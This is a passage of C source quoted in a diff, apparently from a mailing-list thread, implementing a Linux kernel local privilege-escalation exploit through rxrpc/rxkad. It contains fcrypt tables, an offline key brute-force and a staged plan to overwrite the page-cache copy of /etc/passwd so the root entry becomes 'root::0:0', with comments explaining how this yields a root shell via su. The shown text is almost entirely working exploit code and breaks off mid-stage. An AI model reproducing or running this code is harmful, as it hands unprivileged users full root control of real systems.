+&gt;         0x6c, 0x7b, 0x67, 0xc6, 0x23, 0xe3, 0xf2, 0x89, 0x50, 0x9c, 0x03,
+&gt; 0xb7, 0x73, 0xe6, 0xe1, 0x39,
+&gt;         0x31, 0x2c, 0x27, 0x9f, 0xa5, 0x69, 0x44, 0xd6, 0x23, 0x83, 0x98,
+&gt; 0x7d, 0x3c, 0xb4, 0x2d, 0x99,
+&gt;         0x1c, 0x1f, 0x8c, 0x20, 0x03, 0x7c, 0x5f, 0xad, 0xf4, 0xfa, 0x95,
+&gt; 0xca, 0x76, 0x44, 0xcd, 0xb6,
+&gt;         0xb8, 0xa1, 0xa1, 0xbe, 0x9e, 0x54, 0x8f, 0x0b, 0x16, 0x74, 0x31,
+&gt; 0x8a, 0x23, 0x17, 0x04, 0xfa,
+&gt;         0x79, 0x84, 0xb1, 0xf5, 0x13, 0xab, 0xb5, 0x2e, 0xaa, 0x0c, 0x60,
+&gt; 0x6b, 0x5b, 0xc4, 0x4b, 0xbc,
+&gt;         0xe2, 0xaf, 0x45, 0x73, 0xfa, 0xc9, 0x49, 0xcd, 0x00, 0x92, 0x7d,
+&gt; 0x97, 0x7a, 0x18, 0x60, 0x3d,
+&gt;         0xcf, 0x5b, 0xde, 0xc6, 0xe2, 0xe6, 0xbb, 0x8b, 0x06, 0xda, 0x08,
+&gt; 0x15, 0x1b, 0x88, 0x6a, 0x17,
+&gt;         0x89, 0xd0, 0xa9, 0xc1, 0xc9, 0x70, 0x6b, 0xe5, 0x43, 0xf4, 0x68,
+&gt; 0xc8, 0xd3, 0x84, 0x28, 0x0a,
+&gt;         0x52, 0x66, 0xa3, 0xca, 0xf2, 0xe3, 0x7f, 0x7a, 0x31, 0xf7, 0x88,
+&gt; 0x94, 0x5e, 0x9c, 0x63, 0xd5,
+&gt;         0x24, 0x66, 0xfc, 0xb3, 0x57, 0x25, 0xbe, 0x89, 0x44, 0xc4, 0xe0,
+&gt; 0x8f, 0x23, 0x3c, 0x12, 0x52,
+&gt;         0xf5, 0x1e, 0xf4, 0xcb, 0x18, 0x33, 0x1f, 0xf8, 0x69, 0x10, 0x9d,
+&gt; 0xd3, 0xf7, 0x28, 0xf8, 0x30,
+&gt;         0x05, 0x5e, 0x32, 0xc0, 0xd5, 0x19, 0xbd, 0x45, 0x8b, 0x5b, 0xfd,
+&gt; 0xbc, 0xe2, 0x5c, 0xa9, 0x96,
+&gt;         0xef, 0x70, 0xcf, 0xc2, 0x2a, 0xb3, 0x61, 0xad, 0x80, 0x48, 0x81,
+&gt; 0xb7, 0x1d, 0x43, 0xd9, 0xd7,
+&gt;         0x45, 0xf0, 0xd8, 0x8a, 0x59, 0x7c, 0x57, 0xc1, 0x79, 0xc7, 0x34,
+&gt; 0xd6, 0x43, 0xdf, 0xe4, 0x78,
+&gt;         0x16, 0x06, 0xda, 0x92, 0x76, 0x51, 0xe1, 0xd4, 0x70, 0x03, 0xe0,
+&gt; 0x2f, 0x96, 0x91, 0x82, 0x80,
+&gt; };
+&gt; static const uint8_t fc_sbox2_raw[256] = {
+&gt;         0xf0, 0x37, 0x24, 0x53, 0x2a, 0x03, 0x83, 0x86, 0xd1, 0xec, 0x50,
+&gt; 0xf0, 0x42, 0x78, 0x2f, 0x6d,
+&gt;         0xbf, 0x80, 0x87, 0x27, 0x95, 0xe2, 0xc5, 0x5d, 0xf9, 0x6f, 0xdb,
+&gt; 0xb4, 0x65, 0x6e, 0xe7, 0x24,
+&gt;         0xc8, 0x1a, 0xbb, 0x49, 0xb5, 0x0a, 0x7d, 0xb9, 0xe8, 0xdc, 0xb7,
+&gt; 0xd9, 0x45, 0x20, 0x1b, 0xce,
+&gt;         0x59, 0x9d, 0x6b, 0xbd, 0x0e, 0x8f, 0xa3, 0xa9, 0xbc, 0x74, 0xa6,
+&gt; 0xf6, 0x7f, 0x5f, 0xb1, 0x68,
+&gt;         0x84, 0xbc, 0xa9, 0xfd, 0x55, 0x50, 0xe9, 0xb6, 0x13, 0x5e, 0x07,
+&gt; 0xb8, 0x95, 0x02, 0xc0, 0xd0,
+&gt;         0x6a, 0x1a, 0x85, 0xbd, 0xb6, 0xfd, 0xfe, 0x17, 0x3f, 0x09, 0xa3,
+&gt; 0x8d, 0xfb, 0xed, 0xda, 0x1d,
+&gt;         0x6d, 0x1c, 0x6c, 0x01, 0x5a, 0xe5, 0x71, 0x3e, 0x8b, 0x6b, 0xbe,
+&gt; 0x29, 0xeb, 0x12, 0x19, 0x34,
+&gt;         0xcd, 0xb3, 0xbd, 0x35, 0xea, 0x4b, 0xd5, 0xae, 0x2a, 0x79, 0x5a,
+&gt; 0xa5, 0x32, 0x12, 0x7b, 0xdc,
+&gt;         0x2c, 0xd0, 0x22, 0x4b, 0xb1, 0x85, 0x59, 0x80, 0xc0, 0x30, 0x9f,
+&gt; 0x73, 0xd3, 0x14, 0x48, 0x40,
+&gt;         0x07, 0x2d, 0x8f, 0x80, 0x0f, 0xce, 0x0b, 0x5e, 0xb7, 0x5e, 0xac,
+&gt; 0x24, 0x94, 0x4a, 0x18, 0x15,
+&gt;         0x05, 0xe8, 0x02, 0x77, 0xa9, 0xc7, 0x40, 0x45, 0x89, 0xd1, 0xea,
+&gt; 0xde, 0x0c, 0x79, 0x2a, 0x99,
+&gt;         0x6c, 0x3e, 0x95, 0xdd, 0x8c, 0x7d, 0xad, 0x6f, 0xdc, 0xff, 0xfd,
+&gt; 0x62, 0x47, 0xb3, 0x21, 0x8a,
+&gt;         0xec, 0x8e, 0x19, 0x18, 0xb4, 0x6e, 0x3d, 0xfd, 0x74, 0x54, 0x1e,
+&gt; 0x04, 0x85, 0xd8, 0xbc, 0x1f,
+&gt;         0x56, 0xe7, 0x3a, 0x56, 0x67, 0xd6, 0xc8, 0xa5, 0xf3, 0x8e, 0xde,
+&gt; 0xae, 0x37, 0x49, 0xb7, 0xfa,
+&gt;         0xc8, 0xf4, 0x1f, 0xe0, 0x2a, 0x9b, 0x15, 0xd1, 0x34, 0x0e, 0xb5,
+&gt; 0xe0, 0x44, 0x78, 0x84, 0x59,
+&gt;         0x56, 0x68, 0x77, 0xa5, 0x14, 0x06, 0xf5, 0x2f, 0x8c, 0x8a, 0x73,
+&gt; 0x80, 0x76, 0xb4, 0x10, 0x86,
+&gt; };
+&gt; static const uint8_t fc_sbox3_raw[256] = {
+&gt;         0xa9, 0x2a, 0x48, 0x51, 0x84, 0x7e, 0x49, 0xe2, 0xb5, 0xb7, 0x42,
+&gt; 0x33, 0x7d, 0x5d, 0xa6, 0x12,
+&gt;         0x44, 0x48, 0x6d, 0x28, 0xaa, 0x20, 0x6d, 0x57, 0xd6, 0x6b, 0x5d,
+&gt; 0x72, 0xf0, 0x92, 0x5a, 0x1b,
+&gt;         0x53, 0x80, 0x24, 0x70, 0x9a, 0xcc, 0xa7, 0x66, 0xa1, 0x01, 0xa5,
+&gt; 0x41, 0x97, 0x41, 0x31, 0x82,
+&gt;         0xf1, 0x14, 0xcf, 0x53, 0x0d, 0xa0, 0x10, 0xcc, 0x2a, 0x7d, 0xd2,
+&gt; 0xbf, 0x4b, 0x1a, 0xdb, 0x16,
+&gt;         0x47, 0xf6, 0x51, 0x36, 0xed, 0xf3, 0xb9, 0x1a, 0xa7, 0xdf, 0x29,
+&gt; 0x43, 0x01, 0x54, 0x70, 0xa4,
+&gt;         0xbf, 0xd4, 0x0b, 0x53, 0x44, 0x60, 0x9e, 0x23, 0xa1, 0x18, 0x68,
+&gt; 0x4f, 0xf0, 0x2f, 0x82, 0xc2,
+&gt;         0x2a, 0x41, 0xb2, 0x42, 0x0c, 0xed, 0x0c, 0x1d, 0x13, 0x3a, 0x3c,
+&gt; 0x6e, 0x35, 0xdc, 0x60, 0x65,
+&gt;         0x85, 0xe9, 0x64, 0x02, 0x9a, 0x3f, 0x9f, 0x87, 0x96, 0xdf, 0xbe,
+&gt; 0xf2, 0xcb, 0xe5, 0x6c, 0xd4,
+&gt;         0x5a, 0x83, 0xbf, 0x92, 0x1b, 0x94, 0x00, 0x42, 0xcf, 0x4b, 0x00,
+&gt; 0x75, 0xba, 0x8f, 0x76, 0x5f,
+&gt;         0x5d, 0x3a, 0x4d, 0x09, 0x12, 0x08, 0x38, 0x95, 0x17, 0xe4, 0x01,
+&gt; 0x1d, 0x4c, 0xa9, 0xcc, 0x85,
+&gt;         0x82, 0x4c, 0x9d, 0x2f, 0x3b, 0x66, 0xa1, 0x34, 0x10, 0xcd, 0x59,
+&gt; 0x89, 0xa5, 0x31, 0xcf, 0x05,
+&gt;         0xc8, 0x84, 0xfa, 0xc7, 0xba, 0x4e, 0x8b, 0x1a, 0x19, 0xf1, 0xa1,
+&gt; 0x3b, 0x18, 0x12, 0x17, 0xb0,
+&gt;         0x98, 0x8d, 0x0b, 0x23, 0xc3, 0x3a, 0x2d, 0x20, 0xdf, 0x13, 0xa0,
+&gt; 0xa8, 0x4c, 0x0d, 0x6c, 0x2f,
+&gt;         0x47, 0x13, 0x13, 0x52, 0x1f, 0x2d, 0xf5, 0x79, 0x3d, 0xa2, 0x54,
+&gt; 0xbd, 0x69, 0xc8, 0x6b, 0xf3,
+&gt;         0x05, 0x28, 0xf1, 0x16, 0x46, 0x40, 0xb0, 0x11, 0xd3, 0xb7, 0x95,
+&gt; 0x49, 0xcf, 0xc3, 0x1d, 0x8f,
+&gt;         0xd8, 0xe1, 0x73, 0xdb, 0xad, 0xc8, 0xc9, 0xa9, 0xa1, 0xc2, 0xc5,
+&gt; 0xe3, 0xba, 0xfc, 0x0e, 0x25,
+&gt; };
+&gt;
+&gt; static uint32_t fc_sbox0[256], fc_sbox1[256], fc_sbox2[256], fc_sbox3[256];
+&gt;
+&gt; #include &lt;endian.h&gt;
+&gt;
+&gt; static void fcrypt_init_sboxes(void)
+&gt; {
+&gt;         for (int i = 0; i &lt; 256; i++) {
+&gt;                 fc_sbox0[i] = htobe32((uint32_t)fc_sbox0_raw[i] &lt;&lt; 3);
+&gt;                 fc_sbox1[i] = htobe32(((uint32_t)(fc_sbox1_raw[i] &amp; 0x1f)
+&gt; &lt;&lt; 27) |
+&gt;                                 ((uint32_t)fc_sbox1_raw[i] &gt;&gt; 5));
+&gt;                 fc_sbox2[i] = htobe32((uint32_t)fc_sbox2_raw[i] &lt;&lt; 11);
+&gt;                 fc_sbox3[i] = htobe32((uint32_t)fc_sbox3_raw[i] &lt;&lt; 19);
+&gt;         }
+&gt; }
+&gt;
+&gt; #define fc_ror56_64(k, n) \
+&gt;         (k = (k &gt;&gt; (n)) | ((k &amp; ((1ULL &lt;&lt; (n)) - 1)) &lt;&lt; (56 - (n))))
+&gt;
+&gt; typedef struct { uint32_t sched[16]; } fcrypt_uctx;
+&gt;
+&gt; static void fcrypt_user_setkey(fcrypt_uctx *ctx, const uint8_t key[8])
+&gt; {
+&gt;         uint64_t k = 0;
+&gt;         k  = (uint64_t)(key[0] &gt;&gt; 1);
+&gt;         k &lt;&lt;= 7; k |= (uint64_t)(key[1] &gt;&gt; 1);
+&gt;         k &lt;&lt;= 7; k |= (uint64_t)(key[2] &gt;&gt; 1);
+&gt;         k &lt;&lt;= 7; k |= (uint64_t)(key[3] &gt;&gt; 1);
+&gt;         k &lt;&lt;= 7; k |= (uint64_t)(key[4] &gt;&gt; 1);
+&gt;         k &lt;&lt;= 7; k |= (uint64_t)(key[5] &gt;&gt; 1);
+&gt;         k &lt;&lt;= 7; k |= (uint64_t)(key[6] &gt;&gt; 1);
+&gt;         k &lt;&lt;= 7; k |= (uint64_t)(key[7] &gt;&gt; 1);
+&gt;
+&gt;         ctx-&gt;sched[0x0] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
+&gt;         ctx-&gt;sched[0x1] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
+&gt;         ctx-&gt;sched[0x2] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
+&gt;         ctx-&gt;sched[0x3] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
+&gt;         ctx-&gt;sched[0x4] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
+&gt;         ctx-&gt;sched[0x5] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
+&gt;         ctx-&gt;sched[0x6] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
+&gt;         ctx-&gt;sched[0x7] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
+&gt;         ctx-&gt;sched[0x8] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
+&gt;         ctx-&gt;sched[0x9] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
+&gt;         ctx-&gt;sched[0xa] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
+&gt;         ctx-&gt;sched[0xb] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
+&gt;         ctx-&gt;sched[0xc] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
+&gt;         ctx-&gt;sched[0xd] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
+&gt;         ctx-&gt;sched[0xe] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
+&gt;         ctx-&gt;sched[0xf] = htobe32((uint32_t)k);
+&gt; }
+&gt;
+&gt; #define FC_F(R_, L_, sched_) do {                                        \
+&gt;         union { uint32_t l; uint8_t c[4]; } u;
+&gt;    \
+&gt;         u.l = (sched_) ^ (R_);
+&gt;    \
+&gt;         L_ ^= fc_sbox0[u.c[0]] ^ fc_sbox1[u.c[1]] ^
+&gt;   \
+&gt;         fc_sbox2[u.c[2]] ^ fc_sbox3[u.c[3]];                           \
+&gt; } while (0)
+&gt;
+&gt; static void fcrypt_user_decrypt(const fcrypt_uctx *ctx,
+&gt;                 uint8_t out[8], const uint8_t in[8])
+&gt; {
+&gt;         uint32_t L, R;
+&gt;         memcpy(&amp;L, in, 4);
+&gt;         memcpy(&amp;R, in + 4, 4);
+&gt;         FC_F(L, R, ctx-&gt;sched[0xf]);
+&gt;         FC_F(R, L, ctx-&gt;sched[0xe]);
+&gt;         FC_F(L, R, ctx-&gt;sched[0xd]);
+&gt;         FC_F(R, L, ctx-&gt;sched[0xc]);
+&gt;         FC_F(L, R, ctx-&gt;sched[0xb]);
+&gt;         FC_F(R, L, ctx-&gt;sched[0xa]);
+&gt;         FC_F(L, R, ctx-&gt;sched[0x9]);
+&gt;         FC_F(R, L, ctx-&gt;sched[0x8]);
+&gt;         FC_F(L, R, ctx-&gt;sched[0x7]);
+&gt;         FC_F(R, L, ctx-&gt;sched[0x6]);
+&gt;         FC_F(L, R, ctx-&gt;sched[0x5]);
+&gt;         FC_F(R, L, ctx-&gt;sched[0x4]);
+&gt;         FC_F(L, R, ctx-&gt;sched[0x3]);
+&gt;         FC_F(R, L, ctx-&gt;sched[0x2]);
+&gt;         FC_F(L, R, ctx-&gt;sched[0x1]);
+&gt;         FC_F(R, L, ctx-&gt;sched[0x0]);
+&gt;         memcpy(out, &amp;L, 4);
+&gt;         memcpy(out + 4, &amp;R, 4);
+&gt; }
+&gt;
+&gt; /* For the 2-splice chain we want the line to have EXACTLY 6 ':' and a
+&gt;  * shell field that equals "/bin/bash" (in /etc/shells, valid path).
+&gt;  * The two splices interlock as:
+&gt;  *
+&gt;  *   bytes 7..14  (offset 2800): P1 — sets uid=0, gid=1 digit, then
+&gt;  *                4 random gecos-prefix bytes.
+&gt;  *   bytes 15..22 (offset 2808): P2 — wipes the original ':' at line
+&gt;  *                pos 16, preserves ':' at pos 21 and '/' at pos 22.
+&gt;  *
+&gt;  *   Combined line: "test:x:0:G:GGGGGGGGGG:/home/test:/bin/bash"
+&gt;  *                   pos 0    8    21       32
+&gt;  *
+&gt;  *   pw_uid=0, pw_gid=G, pw_dir="/home/test", pw_shell="/bin/bash".
+&gt;  *   Now `su -s /bin/bash test` proceeds through the restricted_shell()
+&gt;  *   check (because /bin/bash IS in /etc/shells) and exec()s /bin/bash
+&gt;  *   under uid=0.
+&gt;  *
+&gt;  * === 3-splice predicates ===
+&gt;  *
+&gt;  * After applying splices A, B, C in order to /etc/passwd line 1
+&gt;  * (offsets 4, 6, 8 — each 8 bytes, last-write-wins), the final state
+&gt;  * of chars 4..15 is determined by these P bytes:
+&gt;  *
+&gt;  *   char 4  = P_A[0]   want: ':'
+&gt;  *   char 5  = P_A[1]   want: ':'
+&gt;  *   char 6  = P_B[0]   want: '0'   (overwrites P_A[2])
+&gt;  *   char 7  = P_B[1]   want: ':'   (overwrites P_A[3])
+&gt;  *   char 8  = P_C[0]   want: '0'   (overwrites P_A[4]/P_B[2])
+&gt;  *   char 9  = P_C[1]   want: ':'   (overwrites P_A[5]/P_B[3])
+&gt;  *   char 10..14 = P_C[2..6]  want: any byte except ':' '\0' '\n'
+&gt;  *   char 15 = P_C[7]   want: ':'
+&gt;  *
+&gt;  * The constraints on P_A[2..7] and P_B[2..7] are vacuous because they
+&gt;  * are overwritten before /etc/passwd is read by anyone — we only care
+&gt;  * about the final state. */
+&gt; static inline int fc_check_pa_nullok(const uint8_t P[8])
+&gt; {
+&gt;         return P[0] == ':' &amp;&amp; P[1] == ':';
+&gt; }
+&gt;
+&gt; static inline int fc_check_pb_nullok(const uint8_t P[8])
+&gt; {
+&gt;         return P[0] == '0' &amp;&amp; P[1] == ':';
+&gt; }
+&gt;
+&gt; static inline int fc_check_pc_nullok(const uint8_t P[8])
+&gt; {
+&gt;         if (P[0] != '0') return 0;
+&gt;         if (P[1] != ':') return 0;
+&gt;         if (P[7] != ':') return 0;
+&gt;         for (int i = 2; i &lt; 7; i++) {
+&gt;                 if (P[i] == ':' || P[i] == '\0' || P[i] == '\n') return 0;
+&gt;         }
+&gt;         return 1;
+&gt; }
+&gt;
+&gt; static uint64_t fc_splitmix64(uint64_t *s)
+&gt; {
+&gt;         uint64_t z = (*s += 0x9E3779B97F4A7C15ULL);
+&gt;         z = (z ^ (z &gt;&gt; 30)) * 0xBF58476D1CE4E5B9ULL;
+&gt;         z = (z ^ (z &gt;&gt; 27)) * 0x94D049BB133111EBULL;
+&gt;         return z ^ (z &gt;&gt; 31);
+&gt; }
+&gt;
+&gt; /* Generic brute-force.  `predicate` decides if a P is acceptable. */
+&gt; typedef int (*pcheck_fn)(const uint8_t P[8]);
+&gt;
+&gt; static int find_K_offline_generic(const uint8_t C[8], uint64_t max_iters,
+&gt;                 pcheck_fn check,
+&gt;                 uint8_t K_out[8], uint8_t P_out[8],
+&gt;                 uint64_t seed_init,
+&gt;                 const char *label)
+&gt; {
+&gt;         fcrypt_uctx ctx;
+&gt;         uint8_t K[8], P[8];
+&gt;         uint64_t seed = seed_init;
+&gt;         struct timespec ts0, ts1;
+&gt;         clock_gettime(CLOCK_MONOTONIC, &amp;ts0);
+&gt;
+&gt;         for (uint64_t iter = 0; iter &lt; max_iters; iter++) {
+&gt;                 uint64_t r = fc_splitmix64(&amp;seed);
+&gt;                 memcpy(K, &amp;r, 8);
+&gt;                 fcrypt_user_setkey(&amp;ctx, K);
+&gt;                 fcrypt_user_decrypt(&amp;ctx, P, C);
+&gt;
+&gt;                 if (check(P)) {
+&gt;                         memcpy(K_out, K, 8);
+&gt;                         memcpy(P_out, P, 8);
+&gt;                         clock_gettime(CLOCK_MONOTONIC, &amp;ts1);
+&gt;                         double dt = (ts1.tv_sec - ts0.tv_sec) +
+&gt;                                 (ts1.tv_nsec - ts0.tv_nsec) / 1e9;
+&gt;                         LOG("%s found after %lu iters in %.2fs (%.2fM/s)
+&gt; K=%02x%02x%02x%02x%02x%02x%02x%02x  P=%02x%02x%02x%02x%02x%02x%02x%02x
+&gt; \"%c%c%c%c%c%c%c%c\"",
+&gt;                                         label,
+&gt;                                         (unsigned long)iter, dt, iter / dt
+&gt; / 1e6,
+&gt;
+&gt; K[0],K[1],K[2],K[3],K[4],K[5],K[6],K[7],
+&gt;
+&gt; P[0],P[1],P[2],P[3],P[4],P[5],P[6],P[7],
+&gt;                                         (P[0]&gt;=32&amp;&amp;P[0]&lt;127)?P[0]:'.',
+&gt;                                         (P[1]&gt;=32&amp;&amp;P[1]&lt;127)?P[1]:'.',
+&gt;                                         (P[2]&gt;=32&amp;&amp;P[2]&lt;127)?P[2]:'.',
+&gt;                                         (P[3]&gt;=32&amp;&amp;P[3]&lt;127)?P[3]:'.',
+&gt;                                         (P[4]&gt;=32&amp;&amp;P[4]&lt;127)?P[4]:'.',
+&gt;                                         (P[5]&gt;=32&amp;&amp;P[5]&lt;127)?P[5]:'.',
+&gt;                                         (P[6]&gt;=32&amp;&amp;P[6]&lt;127)?P[6]:'.',
+&gt;                                         (P[7]&gt;=32&amp;&amp;P[7]&lt;127)?P[7]:'.');
+&gt;                         return 0;
+&gt;                 }
+&gt;
+&gt;                 if ((iter &amp; 0x3ffffff) == 0 &amp;&amp; iter &gt; 0) {
+&gt;                         clock_gettime(CLOCK_MONOTONIC, &amp;ts1);
+&gt;                         double dt = (ts1.tv_sec - ts0.tv_sec) +
+&gt;                                 (ts1.tv_nsec - ts0.tv_nsec) / 1e9;
+&gt;                         fprintf(stderr, "  [%s %.1fs] iter=%lu
+&gt; (%.2fM/s)\n",
+&gt;                                         label, dt, (unsigned long)iter,
+&gt; iter / dt / 1e6);
+&gt;                 }
+&gt;         }
+&gt;         return -1;
+&gt; }
+&gt;
+&gt;
+&gt; int rxrpc_lpe_main(int argc, char **argv)
+&gt; {
+&gt;         fprintf(stderr, "\n=== rxrpc/rxkad LPE EXPLOIT (uid=1000 → root)
+&gt; ===\n");
+&gt;         fprintf(stderr, "[*] uid=%u euid=%u gid=%u\n",
+&gt;                         getuid(), geteuid(), getgid());
+&gt;
+&gt;         {
+&gt;                 const char *no_unshare = getenv("POC_NO_UNSHARE");
+&gt;                 if (!no_unshare || *no_unshare != '1') {
+&gt;                         const char *do_unshare = getenv("POC_UNSHARE");
+&gt;                         if (do_unshare &amp;&amp; *do_unshare == '1') {
+&gt;                                 if (do_unshare_userns_netns() &lt; 0) return
+&gt; 1;
+&gt;                         }
+&gt;                 }
+&gt;         }
+&gt;
+&gt;         /* Open a dummy AF_RXRPC socket to autoload the rxrpc kernel
+&gt; module.
+&gt;          * Without this, the first add_key("rxrpc", ...) call fails with
+&gt; ENODEV
+&gt;          * because the kernel key type "rxrpc" is registered by
+&gt; rxrpc_init() in
+&gt;          * the module load path. */
+&gt;         {
+&gt;                 int dummy = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
+&gt;                 if (dummy &lt; 0) {
+&gt;                         WARN("socket(AF_RXRPC): %s — module not
+&gt; loadable?", strerror(errno));
+&gt;                         return 1;
+&gt;                 }
+&gt;                 close(dummy);
+&gt;                 LOG("rxrpc module autoloaded via dummy socket(AF_RXRPC)");
+&gt;         }
+&gt;
+&gt;         /* Open /etc/passwd RO and mmap the first page (which contains the
+&gt;          * root entry on line 1). */
+&gt;         const char *target_path = getenv("POC_TARGET_FILE");
+&gt;         if (!target_path || !*target_path) target_path = "/etc/passwd";
+&gt;
+&gt;         int rfd_ro = open(target_path, O_RDONLY);
+&gt;         if (rfd_ro &lt; 0) {
+&gt;                 WARN("open %s RO: %s", target_path, strerror(errno));
+&gt;                 return 1;
+&gt;         }
+&gt;         struct stat st;
+&gt;         fstat(rfd_ro, &amp;st);
+&gt;         if (st.st_size &lt; 32) { WARN("target too small: %lld", (long
+&gt; long)st.st_size); return 1; }
+&gt;         LOG("target %s opened RO, size=%lld, uid=%u gid=%u mode=%04o",
+&gt;                         target_path, (long long)st.st_size, st.st_uid,
+&gt; st.st_gid,
+&gt;                         st.st_mode &amp; 07777);
+&gt;
+&gt;         /* mmap first page so the page-cache page stays pinned. */
+&gt;         void *map = mmap(NULL, 4096, PROT_READ, MAP_SHARED, rfd_ro, 0);
+&gt;         if (map == MAP_FAILED) { WARN("mmap: %s", strerror(errno)); return
+&gt; 1; }
+&gt;         LOG("mmap'd %s page-cache at %p (PROT_READ|MAP_SHARED)",
+&gt; target_path, map);
+&gt;
+&gt;         /* If a previous attempt already left the root entry in the patched
+&gt;          * "root::0:0:..." form, treat as success and skip the brute-force
+&gt; /
+&gt;          * trigger stages.  Otherwise proceed regardless of current state —
+&gt;          * the brute-force re-derives K_A/K_B/K_C from whatever bytes are
+&gt;          * currently at offsets 4/6/8 of the page-cache page, so it works
+&gt;          * even on the corrupt residue from a previous failed run. */
+&gt;         {
+&gt;                 const char *m = (const char *)map;
+&gt;                 if (memcmp(m, "root::0:0", 9) == 0) {
+&gt;                         LOG("/etc/passwd already patched (root::0:0...) —
+&gt; nothing to do");
+&gt;                         return 0;
+&gt;                 }
+&gt;                 LOG("/etc/passwd line 1 first 16 bytes:");
+&gt;                 for (int i = 0; i &lt; 16; i++)
+&gt;                         fprintf(stderr, "%02x ", (uint8_t)m[i]);
+&gt;                 fprintf(stderr, "\n");
+&gt;         }
+&gt;         fprintf(stderr, "[*] /etc/passwd line 1 (root entry) BEFORE: '");
+&gt;         for (int i = 0; i &lt; 32; i++) {
+&gt;                 char c = ((const char *)map)[i];
+&gt;                 fputc((c == '\n') ? '$' : (c &gt;= 32 &amp;&amp; c &lt; 127 ? c : '.'),
+&gt; stderr);
+&gt;         }
+&gt;         fprintf(stderr, "'\n");
+&gt;
+&gt;         /* === STAGE 1 — THREE-SPLICE OFFLINE BRUTE FORCE ===
+&gt;          *
+&gt;          * Read THREE 8-byte ciphertexts at file offsets 4, 6, 8.  Search
+&gt;          * independently for K_A (chars 4-5 = "::"), K_B (chars 6-7 =
+&gt; "0:"),
+&gt;          * K_C (chars 8-15 = "0:GGGGGG:" with G non-control).  All searches
+&gt;          * are user-space only — no kernel/VM interaction.
+&gt;          *
+&gt;          * Last-write-wins ordering: trigger A first (covers 4..11), then B
+&gt;          * (covers 6..13 — overrides A's 6..11), then C (covers 8..15 —
+&gt;          * overrides A's 8..11 and B's 8..13).  Final state of chars 4..15:
+&gt;          *   chars 4..5  = P_A[0..1]
+&gt;          *   chars 6..7  = P_B[0..1]
+&gt;          *   chars 8..15 = P_C[0..7]
+&gt;          *
+&gt; =================================================================*/
+&gt;         uint8_t Ca[8], Cb[8], Cc[8];
+&gt;         int off_a = 4, off_b = 6, off_c = 8;
+&gt;         if (pread(rfd_ro, Ca, 8, off_a) != 8) { WARN("pread Ca: %s",
+&gt; strerror(errno)); return 1; }
+&gt;         if (pread(rfd_ro, Cb, 8, off_b) != 8) { WARN("pread Cb: %s",
+&gt; strerror(errno)); return 1; }
+&gt;         if (pread(rfd_ro, Cc, 8, off_c) != 8) { WARN("pread Cc: %s",
+&gt; strerror(errno)); return 1; }
+&gt;
+&gt;         LOG("Ca @ %d: %02x%02x%02x%02x%02x%02x%02x%02x
+&gt; \"%c%c%c%c%c%c%c%c\"",
+&gt;                         off_a,
+&gt; Ca[0],Ca[1],Ca[2],Ca[3],Ca[4],Ca[5],Ca[6],Ca[7],
+&gt;                         (Ca[0]&gt;=32&amp;&amp;Ca[0]&lt;127)?Ca[0]:'.',
+&gt; (Ca[1]&gt;=32&amp;&amp;Ca[1]&lt;127)?Ca[1]:'.',
+&gt;                         (Ca[2]&gt;=32&amp;&amp;Ca[2]&lt;127)?Ca[2]:'.',
+&gt; (Ca[3]&gt;=32&amp;&amp;Ca[3]&lt;127)?Ca[3]:'.',
+&gt;                         (Ca[4]&gt;=32&amp;&amp;Ca[4]&lt;127)?Ca[4]:'.',
+&gt; (Ca[5]&gt;=32&amp;&amp;Ca[5]&lt;127)?Ca[5]:'.',
+&gt;                         (Ca[6]&gt;=32&amp;&amp;Ca[6]&lt;127)?Ca[6]:'.',
+&gt; (Ca[7]&gt;=32&amp;&amp;Ca[7]&lt;127)?Ca[7]:'.');
+&gt;         LOG("Cb @ %d: %02x%02x%02x%02x%02x%02x%02x%02x
+&gt; \"%c%c%c%c%c%c%c%c\"",
+&gt;                         off_b,
+&gt; Cb[0],Cb[1],Cb[2],Cb[3],Cb[4],Cb[5],Cb[6],Cb[7],
+&gt;                         (Cb[0]&gt;=32&amp;&amp;Cb[0]&lt;127)?Cb[0]:'.',
+&gt; (Cb[1]&gt;=32&amp;&amp;Cb[1]&lt;127)?Cb[1]:'.',
+&gt;                         (Cb[2]&gt;=32&amp;&amp;Cb[2]&lt;127)?Cb[2]:'.',
+&gt; (Cb[3]&gt;=32&amp;&amp;Cb[3]&lt;127)?Cb[3]:'.',
+&gt;                         (Cb[4]&gt;=32&amp;&amp;Cb[4]&lt;127)?Cb[4]:'.',
+&gt; (Cb[5]&gt;=32&amp;&amp;Cb[5]&lt;127)?Cb[5]:'.',
+&gt;                         (Cb[6]&gt;=32&amp;&amp;Cb[6]&lt;127)?Cb[6]:'.',
+&gt; (Cb[7]&gt;=32&amp;&amp;Cb[7]&lt;127)?Cb[7]:'.');
+&gt;         LOG("Cc @ %d: %02x%02x%02x%02x%02x%02x%02x%02x
+&gt; \"%c%c%c%c%c%c%c%c\"",
+&gt;                         off_c,
+&gt; Cc[0],Cc[1],Cc[2],Cc[3],Cc[4],Cc[5],Cc[6],Cc[7],
+&gt;                         (Cc[0]&gt;=32&amp;&amp;Cc[0]&lt;127)?Cc[0]:'.',
+&gt; (Cc[1]&gt;=32&amp;&amp;Cc[1]&lt;127)?Cc[1]:'.',
+&gt;                         (Cc[2]&gt;=32&amp;&amp;Cc[2]&lt;127)?Cc[2]:'.',
+&gt; (Cc[3]&gt;=32&amp;&amp;Cc[3]&lt;127)?Cc[3]:'.',
+&gt;                         (Cc[4]&gt;=32&amp;&amp;Cc[4]&lt;127)?Cc[4]:'.',
+&gt; (Cc[5]&gt;=32&amp;&amp;Cc[5]&lt;127)?Cc[5]:'.',
+&gt;                         (Cc[6]&gt;=32&amp;&amp;Cc[6]&lt;127)?Cc[6]:'.',
+&gt; (Cc[7]&gt;=32&amp;&amp;Cc[7]&lt;127)?Cc[7]:'.');
